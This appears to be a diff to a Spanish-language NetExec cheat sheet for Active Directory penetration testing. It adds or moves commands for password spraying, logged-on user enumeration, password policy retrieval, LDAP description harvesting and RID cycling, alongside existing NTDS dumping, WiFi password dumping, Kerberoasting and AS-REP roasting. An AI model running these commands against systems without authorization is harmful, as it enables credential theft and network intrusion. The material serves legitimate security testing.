@@ -17,7 +17,7 @@ netexec smb <IP-ADDRESS> -u '<USERNAME>' -p '<PASSWORD>' --port <PORT>
 
 #### Password Spraying
 ```
-netexec smb 192.168.1.0/24 -u '<USERNAME>' -p listpassword.txt
+netexec smb 192.168.1.0/24 -u '<USERNAME>' -p listpassword.txt | grep +
 ```
 
 #### Spraying Attack con usuario y contraseña
@@ -76,6 +76,11 @@ netexec smb <IP-ADDRESS> -u '<USERNAME>' -p '<PASSWORD>' --users
 netexec smb <IP-ADDRESS> -u '<USERNAME>' -p '<PASSWORD>' --groups
 ```
 
+#### Enumeración de los usarios logueados actualmente
+```
+netexec smb <IP-ADDRESS> -u '<USERNAME>' -p '<PASSWORD>' --loggedon-users
+```
+
 #### Enumeración de los grupos locales
 ```
 netexec smb <IP-ADDRESS> -u '<USERNAME>' -p '<PASSWORD>' --local-group
@@ -102,9 +107,24 @@ netexec smb <IP-ADDRESS> -u '<USERNAME>' -p '<PASSWORD>' --ntds
 netexec smb <IP-ADDRESS> -u '<USERNAME>' -p '<PASSWORD>' --ntds vss
 ```
 
+#### Obtener la politica de contraseñas del AD
+```
+netexec smb <IP-ADDRESS> -u '<USERNAME>' -p '<PASSWORD>' --pass-pol
+```
+
 #### Dumping WIFI Password
 ```
 netexec smb <IP-ADDRESS> -u '<USERNAME>' -p '<PASSWORD>' -M wireless
+```
+
+#### Obtener las descripciones de los usuarios de LDAP
+```
+netexec ldap <IP-ADDRESS> -u '<USERNAME>' -p '<PASSWORD>' -M get-desc-users
+```
+
+#### Enumeración de usuario (Fuerza Bruta) por RID (RID Cycling Attack)
+```
+netexec smb <IP-ADDRESS> -u 'guest' -p '' --rid-brute
 ```
 
 #### Ataque de Kerberoasting
@@ -115,11 +135,6 @@ netexec ldap <IP-ADDRESS> -u '<USERNAME>' -p '<PASSWORD>' --kerberoasting <OUTPU
 #### Ataque de Asreproast
 ```
 netexec ldap <IP-ADDRESS> -u '<USERNAME>' -p '<PASSWORD>' --asreproast <OUTPUT-FILE>
-```
-
-#### Enumeración de usuario (Fuerza Bruta) por RID
-```
-netexec smb <IP-ADDRESS> -u 'gest' -p '' --rid-brute
 ```
 
 ---
